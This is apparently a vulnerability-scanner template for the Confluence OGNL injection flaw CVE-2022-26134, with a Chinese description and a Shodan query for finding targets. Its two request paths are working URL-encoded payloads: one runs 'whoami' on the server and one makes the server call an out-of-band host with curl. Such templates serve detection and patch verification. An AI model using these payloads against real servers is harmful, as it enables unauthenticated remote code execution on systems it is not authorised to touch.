id: CVE-2022-26134

info:
  name: Confluence - 远程命令执行漏洞(CVE-2022-26134)
  author: wintry
  severity: critical
  description: |
    Confluence服务器和数据中心容易受到未经身份验证的远程代码执行漏洞的影响.
  metadata:
    max-request: 2
    shodan-query: http.component:"Atlassian Confluence"
    verified: true
  tags: confluence

http:
  - method: GET
    path:
      - "{{BaseURL}}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"
      - "{{BaseURL}}/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec(%22curl%20http://{{interactsh}}/{{url}}%22)%7D/"

    stop-at-first-match: true
    req-condition: true
    matchers-condition: or
    matchers:
      - type: dsl
        dsl:
          - 'contains(to_lower(all_headers_1), "x-cmd-response:")'

    extractors:
      - type: kval
        part: header
        kval:
          - "x_cmd_response"